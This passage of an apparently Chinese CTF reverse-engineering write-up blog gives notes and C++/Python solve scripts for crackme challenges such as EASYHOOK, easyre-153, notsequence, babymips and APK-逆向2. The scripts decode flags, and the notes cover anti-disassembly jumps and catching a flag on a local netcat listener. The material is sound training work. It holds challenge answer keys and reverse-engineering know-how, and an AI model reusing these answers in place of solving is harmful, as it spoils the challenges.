class="number">0x41</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x46</span>,<span class="number">0x5a</span>,<span class="number">0x44</span>,<span class="number">0x42</span>,<span class="number">0x6e</span>,<span class="number">0x0c</span>,<span class="number">0x44</span>,<span class="number">0x72</span>,<span class="number">0x0c</span>,<span class="number">0x0d</span>,<span class="number">0x40</span>,<span class="number">0x3e</span>,<span class="number">0x4b</span>,<span class="number">0x5f</span>,<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x4c</span>,<span class="number">0x5e</span>,<span class="number">0x5b</span>,<span class="number">0x17</span>,<span class="number">0x6e</span>,<span class="number">0x0c</span>,<span class="number">0x16</span>,<span class="number">0x68</span>,<span class="number">0x5b</span>,<span class="number">0x12</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)&#123;</span><br><span class="line">cout &lt;&lt;(<span class="type">char</span>)(s[i%<span class="number">16</span>]^a[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><ul><li>.net题目，dnspy打开，通过调试到入口点找到关键代码</li></ul><h3 id="EASYHOOK"><a href="#EASYHOOK" class="headerlink" title="EASYHOOK"></a>EASYHOOK</h3><ul><li>hook函数修改值跳转到真正加密函数</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> lis[<span class="number">100</span>] = &#123;<span class="number">0x61</span>,<span class="number">0x6a</span>,<span class="number">0x79</span>,<span class="number">0x67</span>,<span class="number">0x6b</span>,<span class="number">0x46</span>,<span class="number">0x6d</span>,<span class="number">0x2e</span>,<span class="number">0x7f</span>,<span class="number">0x5f</span>,<span class="number">0x7e</span>,<span class="number">0x2d</span>,<span class="number">0x53</span>,<span class="number">0x56</span>,<span class="number">0x7b</span>,<span class="number">0x38</span>,<span class="number">0x6d</span>,<span class="number">0x4c</span>,<span class="number">0x6e</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">18</span>; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">18</span>)&#123;</span><br><span class="line">lis[i] ^= <span class="number">0x13</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(i % <span class="number">2</span>)&#123;</span><br><span class="line">lis[i] ^= i;</span><br><span class="line">lis[i] += i;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">lis[i] ^= i;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">18</span>; i &gt;= <span class="number">2</span>; i-=<span class="number">2</span>)&#123;</span><br><span class="line">lis[i] = lis[i<span class="number">-2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">18</span>; i++)&#123;</span><br><span class="line">cout &lt;&lt;(<span class="type">char</span>)lis[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ReverseMe-120"><a href="#ReverseMe-120" class="headerlink" title="ReverseMe-120"></a>ReverseMe-120</h3><ul><li>输入–&gt;base64解码–&gt;异或</li></ul><h3 id="key"><a href="#key" class="headerlink" title="key"></a>key</h3><ul><li>这题有点别调，字符串检索找到关键代码，然后根据加密逆写就行，建议7.0版本以下ida</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">string s = <span class="string">&quot;themidathemidathemida&quot;</span>;</span><br><span class="line">string t = <span class="string">&quot;&gt;----++++....&lt;&lt;&lt;&lt;.&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; s[i]; i++)&#123;</span><br><span class="line">s[i] = (s[i]^t[i]) + <span class="number">22</span> + <span class="number">9</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; s[i]; i++)&#123;</span><br><span class="line">cout &lt;&lt;(<span class="type">char</span>)s[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easyre-153"><a href="#easyre-153" class="headerlink" title="easyre-153"></a>easyre-153</h3><ul><li>pipe、fork双进程</li><li>利用必然跳转让ida反汇编错误</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov     [ebp+var_D], al</span><br><span class="line">mov     [ebp+var_C], 0</span><br><span class="line">cmp     [ebp+var_C], 1</span><br><span class="line">jnz     short loc_80486D3</span><br></pre></td></tr></table></figure><ul><li>去掉必然跳转以后重新反汇编仿写逻辑即可</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> v2[<span class="number">100</span>];</span><br><span class="line">string a1 = <span class="string">&quot;69800876143568214356928753&quot;</span>;</span><br><span class="line"></span><br><span class="line">  v2[<span class="number">0</span>] = <span class="number">2</span> * a1[<span class="number">1</span>];</span><br><span class="line">  v2[<span class="number">1</span>] = a1[<span class="number">4</span>] + a1[<span class="number">5</span>];</span><br><span class="line">  v2[<span class="number">2</span>] = a1[<span class="number">8</span>] + a1[<span class="number">9</span>];</span><br><span class="line">  v2[<span class="number">3</span>] = <span class="number">2</span> * a1[<span class="number">12</span>];</span><br><span class="line">  v2[<span class="number">4</span>] = a1[<span class="number">18</span>] + a1[<span class="number">17</span>];</span><br><span class="line">  v2[<span class="number">5</span>] = a1[<span class="number">10</span>] + a1[<span class="number">21</span>];</span><br><span class="line">  v2[<span class="number">6</span>] = a1[<span class="number">9</span>] + a1[<span class="number">25</span>];</span><br><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; v2[i]; i++)&#123;</span><br><span class="line"> std::cout &lt;&lt;(<span class="type">char</span>)v2[i];</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Newbie-calculations"><a href="#Newbie-calculations" class="headerlink" title="Newbie_calculations"></a>Newbie_calculations</h3><ul><li>三个函数组成的一长串，就是简单的加减乘混淆</li></ul><h3 id="notsequence"><a href="#notsequence" class="headerlink" title="notsequence"></a>notsequence</h3><ul><li>杨辉三角题目，贴个简单分析代码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl main()</span><br><span class="line">&#123;</span><br><span class="line">  //不断输入数字flag</span><br><span class="line">  do&#123;</span><br><span class="line">    v0 = v3++;</span><br><span class="line">    scanf(<span class="string">&quot;%d&quot;</span>, v0);</span><br><span class="line">  &#125;<span class="keyword">while</span> (*(v3 - <span class="number">1</span>));</span><br><span class="line">  //验证杨辉三角每一层之和为<span class="number">2</span>^&lt;sub&gt;n-<span class="number">1</span>&lt;/sub&gt;</span><br><span class="line">  v2 = sub_80486CD(&amp;unk_8049BE0);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == -<span class="number">1</span> )</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  //验证杨辉三角第n层的第i个元素等于前n-<span class="number">1</span>层第i-<span class="number">1</span>个元素的和</span><br><span class="line">  <span class="keyword">if</span> ( sub_8048783(&amp;unk_8049BE0, v2) != <span class="number">1</span> )</span><br><span class="line">    exit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(v2 == <span class="number">20</span>)&#123;   //确定一共<span class="number">20</span>层</span><br><span class="line">    puts(<span class="string">&quot;Congratulations! fl4g is :\nRCTF&#123;md5(/*what you input without space or \\n~*/)&#125;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>所以将杨辉三角前20层的数字顺序拼接即可，网友脚本：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">triangles</span>():</span><br><span class="line">s=[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">yield</span> s</span><br><span class="line">s.append(<span class="number">0</span>)</span><br><span class="line">s=[s[i-<span class="number">1</span>]+s[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s))]</span><br><span class="line">n=<span class="number">0</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> triangles():</span><br><span class="line">flag+=<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,i))</span><br><span class="line">n+=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> n==<span class="number">20</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag=hashlib.md5(flag.encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;RCTF&#123;&quot;</span>+flag+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="easy-Maze"><a href="#easy-Maze" class="headerlink" title="easy_Maze"></a>easy_Maze</h3><ul><li>迷宫题，首先根据传参确定7*7迷宫以及迷宫存储位置</li><li>动调到输入之前，即step_2函数之前，获取迷宫，得到flag</li></ul><h3 id="serial-150"><a href="#serial-150" class="headerlink" title="serial-150"></a>serial-150</h3><ul><li>有花指令，动调恢复代码推断即可</li></ul><h3 id="reverse-for-the-holy-grail-350"><a href="#reverse-for-the-holy-grail-350" class="headerlink" title="reverse-for-the-holy-grail-350"></a>reverse-for-the-holy-grail-350</h3><ul><li>c++逆向，关键函数stringmod分析如下</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">stringMod</span><span class="params">(__int64 *flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// r9</span></span><br><span class="line">  __int64 v2; <span class="comment">// r10</span></span><br><span class="line">  __int64 cnt; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// er8</span></span><br><span class="line">  <span class="type">int</span> *v5; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> *v6; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// er9</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// er10</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> mod3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v14[<span class="number">18</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp+48h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v14, <span class="number">0</span>, <span class="built_in">sizeof</span>(v14));</span><br><span class="line">  v2 = *flag;</span><br><span class="line">  cnt = v4 = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//第三位判断逻辑</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123; </span><br><span class="line">    v14[cnt] = v2[cnt]; </span><br><span class="line">    <span class="keyword">if</span>(cnt % <span class="number">3</span> == <span class="number">0</span>)&#123; v14[cnt] == firstchar[cnt / <span class="number">3</span>]; &#125;</span><br><span class="line">    ++cnt;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( cnt != <span class="built_in">len</span>(flag));</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag进行异或</span></span><br><span class="line">  v5 = v14;</span><br><span class="line">  v6 = v14;</span><br><span class="line">  v7 = <span class="number">666</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *v6 ^= v7;</span><br><span class="line">    v7 += v7 % <span class="number">5</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">len</span>(flag) != v6 );</span><br><span class="line"><span class="comment">//第一三位的验证逻辑</span></span><br><span class="line">  v8 = <span class="number">1</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">1</span>;</span><br><span class="line">  mod3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( mod3 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *v5 != thirdchar[v9] ) wrong;<span class="comment">//mod2 == third</span></span><br><span class="line">      <span class="keyword">if</span> ( v10 % *v5 != masterArray[v9] ) wrong;<span class="comment">//mod1*mod2%mod3 == master</span></span><br><span class="line">      ++v9;</span><br><span class="line">      v10 = <span class="number">1</span>;</span><br><span class="line">      mod3 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      v10 *= *v5;</span><br><span class="line">      <span class="keyword">if</span> ( ++mod3 == <span class="number">3</span> ) mod3 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8,++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v8 != <span class="number">19</span> );</span><br></pre></td></tr></table></figure><ul><li>解题脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">f3 = [<span class="number">0x41</span>,<span class="number">0x69</span>,<span class="number">0x6e</span>,<span class="number">0x45</span>,<span class="number">0x6f</span>,<span class="number">0x61</span>]</span><br><span class="line">f2 = [<span class="number">0x2ef</span>,<span class="number">0x2c4</span>,<span class="number">0x2dc</span>,<span class="number">0x2c7</span>,<span class="number">0x2de</span>,<span class="number">0x2fc</span>]</span><br><span class="line">f1 = [<span class="number">0x1d7</span>,<span class="number">0xc</span>,<span class="number">0x244</span>,<span class="number">0x25e</span>,<span class="number">0x93</span>,<span class="number">0x6c</span>]</span><br><span class="line">flag = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>)]</span><br><span class="line"><span class="comment">#mod3=0填充</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">18</span>,<span class="number">3</span>):</span><br><span class="line">flag[i] = f3[i//<span class="number">3</span>]</span><br><span class="line"><span class="comment"># 生成异或序列</span></span><br><span class="line">x = <span class="number">666</span></span><br><span class="line">xor = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">xor.append(x)</span><br><span class="line">x += x % <span class="number">5</span></span><br><span class="line"><span class="comment"># mod3=2填充</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">18</span>,<span class="number">3</span>):</span><br><span class="line">flag[i] = f2[i//<span class="number">3</span>] ^ xor[i]</span><br><span class="line"><span class="comment"># 剩余位填充</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">18</span>,<span class="number">3</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">35</span>,<span class="number">125</span>):</span><br><span class="line"><span class="keyword">if</span> ((j^xor[i]) * (flag[i-<span class="number">1</span>]^xor[i-<span class="number">1</span>]) % f2[i//<span class="number">3</span>] == f1[i//<span class="number">3</span>]):</span><br><span class="line">flag[i] = j</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;tuctf&#123;&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="babymips"><a href="#babymips" class="headerlink" title="babymips"></a>babymips</h3><ul><li>数字高低位置换问题</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//cmp2</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">5</span>; i &lt; strlen(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (i &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      v1 = (a1[i] &gt;&gt; <span class="number">2</span>) | (a1[i] &lt;&lt; <span class="number">6</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v1 = (a1[i] &lt;&lt; <span class="number">2</span>) | (a1[i] &gt;&gt; <span class="number">6</span>);</span><br><span class="line">    a1[i] = v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !strncmp(a1 + <span class="number">5</span>, (const char *)off_410D04, 0x1Bu) )</span><br><span class="line">//cmp1为异或</span><br></pre></td></tr></table></figure><ul><li>Solve</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&quot;Q|j&#123;g&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(x[i]) ^ (<span class="number">32</span>-i)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">lis = [<span class="number">0x52</span>,<span class="number">0xfd</span>,<span class="number">0x16</span>,<span class="number">0xa4</span>,<span class="number">0x89</span>,<span class="number">0xbd</span>,<span class="number">0x92</span>,<span class="number">0x80</span>,<span class="number">0x13</span>,<span class="number">0x41</span>,<span class="number">0x54</span>,<span class="number">0xa0</span>,<span class="number">0x8d</span>,<span class="number">0x45</span>,<span class="number">0x18</span>,<span class="number">0x81</span>,<span class="number">0xde</span>,<span class="number">0xfc</span>,<span class="number">0x95</span>,<span class="number">0xf0</span>,<span class="number">0x16</span>,<span class="number">0x79</span>,<span class="number">0x1a</span>,<span class="number">0x15</span>,<span class="number">0x5b</span>,<span class="number">0x75</span>,<span class="number">0x1f</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">32</span>):</span><br><span class="line">    <span class="keyword">if</span>(i &amp; <span class="number">1</span> != <span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(((lis[i-<span class="number">5</span>]&lt;&lt;<span class="number">2</span>)&amp;<span class="number">0xff</span> | (lis[i-<span class="number">5</span>]&gt;&gt;<span class="number">6</span>)&amp;<span class="number">0xff</span>)^(<span class="number">32</span>-i)),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(((lis[i-<span class="number">5</span>]&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0xff</span> | (lis[i-<span class="number">5</span>]&lt;&lt;<span class="number">6</span>)&amp;<span class="number">0xff</span>) ^ (<span class="number">32</span>-i)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="APK-逆向2"><a href="#APK-逆向2" class="headerlink" title="APK-逆向2"></a>APK-逆向2</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="type">static</span> <span class="type">void</span> <span class="title">Main</span><span class="params">(string[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//监听端口</span></span><br><span class="line">    string hostname = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="type">int</span> port = <span class="number">31337</span>;</span><br><span class="line">    tcpClient.<span class="built_in">Connect</span>(hostname, port);</span><br><span class="line">    <span class="comment">//自我查找输出flag</span></span><br><span class="line">    string text = <span class="string">&quot;Super Secret Key&quot;</span>;</span><br><span class="line">    string text2 = Program.<span class="built_in">read</span>();</span><br><span class="line">    client.<span class="built_in">Send</span>(Encoding.ASCII.<span class="built_in">GetBytes</span>(<span class="string">&quot;CTF&#123;&quot;</span>));</span><br><span class="line">    foreach (<span class="type">char</span> x in text)</span><br><span class="line">&#123;</span><br><span class="line">client.<span class="built_in">Send</span>(Encoding.ASCII.<span class="built_in">GetBytes</span>(Program.<span class="built_in">search</span>(x, text2)));</span><br><span class="line">&#125;</span><br><span class="line">Console.<span class="built_in">WriteLine</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//find &amp; cmp</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="type">static</span> string <span class="title">search</span><span class="params">(<span class="type">char</span> x, string text)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> length = text.Length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (x == text[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> value = i * <span class="number">1337</span> % <span class="number">256</span>;</span><br><span class="line">            <span class="keyword">return</span> Convert.<span class="built_in">ToString</span>(value, <span class="number">16</span>).<span class="built_in">PadLeft</span>(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;??&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>监听本机端口运行得到flag</li><li>nc -l -p 31773</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import http.server</span><br><span class="line"></span><br><span class="line">server_address = (&#x27;127.0.0.1&#x27;, 31337)</span><br><span class="line">handler_class = http.server.BaseHTTPRequestHandler</span><br><span class="line">httpd = http.server.HTTPServer(server_address, handler_class)</span><br><span class="line">httpd.serve_forever()</span><br></pre></td></tr></table></figure><ul><li>代码仿写得到flag<ul><li>本质上就是在源程序上取和key字符相同的字节下标，然后做一个计算</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 